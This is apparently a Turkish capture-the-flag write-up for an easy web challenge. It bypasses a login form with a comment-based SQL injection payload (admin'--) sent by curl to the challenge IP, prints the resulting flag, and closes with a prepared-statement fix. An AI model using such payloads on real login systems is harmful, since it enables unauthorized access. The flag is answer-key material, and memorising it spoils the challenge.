# 💉 injection1 - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Kolay-darkgreen?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-SQL Injection-purple?style=for-the-badge" alt="SQL Injection">
</p>

---

## 📋 Soru Bilgileri
  
**Kategori:** Web  
**Seviye:** Kolay  
**Puan:** 300

**Açıklama:** Agresif araçlara hiç gerek yok

**Challenge URL:** http://64.226.74.243:10001/

---

## 🔍 Analiz

**Hedef:** Login formunda SQL Injection zafiyetini kullanarak authentication bypass yapıp flag elde etmek

**Strateji:** Form analizi → SQL Injection → Flag

**İpuçları:**
- 🎯 "Agresif araçlar yok" → SQLMap gibi otomatik araçlar kullanmaya gerek yok
- 💉 "injection1" → SQL Injection zafiyeti var

---

## ✅ Çözüm Adımları

### 🔧 **Adım 1: Form Analizi - cURL ile Keşif**

**Terminalden HTTP response'u inceliyoruz:**

```bash
curl http://64.226.74.243:10001/
```

**Response:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Web101</title>
</head>
<body>
    <h1>Login</h1>
    <form method="POST">
        <input type="text" name="username" placeholder="username"><br><br>
        <input type="password" name="password" placeholder="password"><br><br>
        <button type="submit">Login</button>
    </form>
</body>
</html>
```

**Form Analizi:**
- ✅ **Method:** POST
- ✅ **Parametreler:** `username` ve `password`
- 💡 SQL Injection için test edilebilir

---

### 💎 **Adım 2: Comment-based SQL Injection - EXPLOIT!**

**SQL comment kullanarak password kontrolünü tamamen kaldırıyoruz:**

```bash
curl -X POST http://64.226.74.243:10001/ -d "username=admin'--&password="
```

**🎉 BINGO! Response:**

```html
<h2>Welcome!</h2>
<p>Your flag is:</p>
<pre>FLAG{web101_baby_sqli_500dolarbounty_3243543613143546968345732765423512372163}</pre>
<br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MySQL server version for the right syntax to use 
near '' AND password = ''' at line 1 in /var/www/html/index.php:20
```

**✅ BAŞARILI! Analiz:**
- ✅ **Flag elde edildi!**
- 🎯 `admin'--` payloadu password kontrolünü devre dışı bıraktı
- `--` sonrası SQL yorumu oldu

---

## 🏁 **FLAG**

```
FLAG{web101_baby_sqli_500dolarbounty_3243543613143546968345732765423512372163}
```

---

## 🧬 Teknik Analiz

### **SQL Injection Mekanizması**

**Güvensiz sorgu:**
```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

**Normal akış:**
```sql
SELECT * FROM users WHERE username = 'john' AND password = 'secret123'
```

**Exploit akışı:**
```sql
# Input: username=admin'--, password=
SELECT * FROM users WHERE username = 'admin'--' AND password = ''
                                             ↑
                                    Burası artık yorum!

# Gerçek çalışan sorgu:
SELECT * FROM users WHERE username = 'admin'
```

**Sonuç:**
- ✅ Password kontrolü atlandı
- ✅ Authentication bypass başarılı

---

## 🛡️ Nasıl Önlenir?

### **Prepared Statements (En İyi Yöntem)**

```php
// GÜVENLİ KOD
$stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

**Neden güvenli:**
- ✅ `?` placeholder'ları kullanılıyor
- ✅ `bind_param()` değerleri escape ediyor
- ✅ SQL injection imkansız

---

## 🛠️ **Kullanılan Komutlar**

```bash
# İlk keşif
curl http://64.226.74.243:10001/

# EXPLOIT
curl -X POST http://64.226.74.243:10001/ -d "username=admin'--&password="
```

---

## 💭 **Çözüm Akışı**

```
🌐 injection1 Web Challenge
            ↓
🔧 Form analizi (curl)
   → POST method
   → username, password parametreleri
            ↓
💉 SQL Injection
   → username=admin'--
   → Password kontrolü atlandı
            ↓
🏁 FLAG{web101_baby_sqli_500dolarbounty_3243543613143546968345732765423512372163}
```
